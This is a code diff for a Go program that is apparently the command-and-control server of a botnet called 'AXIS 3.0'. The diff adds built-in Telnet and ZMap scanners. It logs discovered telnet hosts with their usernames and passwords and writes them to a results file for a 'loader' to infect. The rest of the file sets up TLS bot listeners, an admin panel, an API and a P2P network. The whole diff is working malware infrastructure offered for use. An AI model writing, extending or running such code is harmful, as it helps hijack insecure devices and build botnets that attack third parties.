@@ -16,8 +16,8 @@ import (
 )
 
 /*
- * AXIS 3.0 C&C Server
- * Hybrid: Traditional CNC + P2P
+ * AXIS 3.0 C2 Server
+ * Hybrid: Traditional C2 + P2P + Integrated Scanners
  */
 
 const DatabaseAddr string = "127.0.0.1:3306"
@@ -26,7 +26,7 @@ const DatabasePass string = "root"
 const DatabaseTable string = "AXIS3"
 
 /* Bot connection ports */
-const BotListenAddr string = "0.0.0.0:443"           /* Traditional CNC (TLS) */
+const BotListenAddr string = "0.0.0.0:443"           /* Traditional C2 (TLS) */
 const TelnetTLSListenAddr string = "0.0.0.0:6969"    /* Admin panel */
 const APIListenAddr string = "0.0.0.0:3779"          /* REST API */
 
@@ -37,6 +37,10 @@ const BotTLSKeyPath string = "bot_tls_key.pem"
 
 var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
+
+// Global scanners
+var telnetScanner *TelnetScanner
+var zmapScanner *ZMapScanner
 
 func main() {
 	/* Load bot TLS certificate */
@@ -57,7 +61,7 @@ func main() {
 		},
 	}
 
-	/* Start traditional CNC bot listener (TLS on port 443) */
+	/* Start traditional C2 bot listener (TLS on port 443) */
 	botListener, err := tls.Listen("tcp", BotListenAddr, botTLSConfig)
 	if err != nil {
 		fmt.Printf("Failed to start bot listener: %v\n", err)
@@ -119,20 +123,41 @@ func main() {
 		go api.Start()
 	}
 
+	/* Initialize integrated scanners */
+	telnetScanner = NewTelnetScanner(100*time.Millisecond, 50)
+	zmapScanner = NewZMapScanner(100, 23)
+
 	/* Status */
 	fmt.Println("")
-	fmt.Println("AXIS 3.0 C&C Server Running")
+	fmt.Println("AXIS 3.0 C2 Server Running")
 	fmt.Println("===========================")
 	fmt.Printf("Bots:      TLS on %s\n", BotListenAddr)
 	fmt.Printf("Admin:     TLS on %s\n", TelnetTLSListenAddr)
 	fmt.Printf("API:       HTTP on %s\n", APIListenAddr)
 	fmt.Println("")
+	fmt.Println("Scanners:  Telnet + ZMap integrated")
 	fmt.Println("P2P Network: UDP 49152/49153 (standalone)")
 	fmt.Println("")
+
+	/* Process scan results */
+	go processScanResults()
 
 	/* Keep running */
 	for {
 		time.Sleep(60 * time.Second)
+	}
+}
+
+func processScanResults() {
+	for {
+		select {
+		case result := <-telnetScanner.GetResults():
+			// Write to results file for loader to process
+			WriteResultsToFile("scan-results.txt", []ScanResult{result})
+			fmt.Printf("[+] Found telnet: %s:%d %s:%s\n", result.IP, result.Port, result.Username, result.Password)
+		case result := <-zmapScanner.GetResults():
+			fmt.Printf("[+] Found open port: %s:%d\n", result.IP, result.Port)
+		}
 	}
 }
 
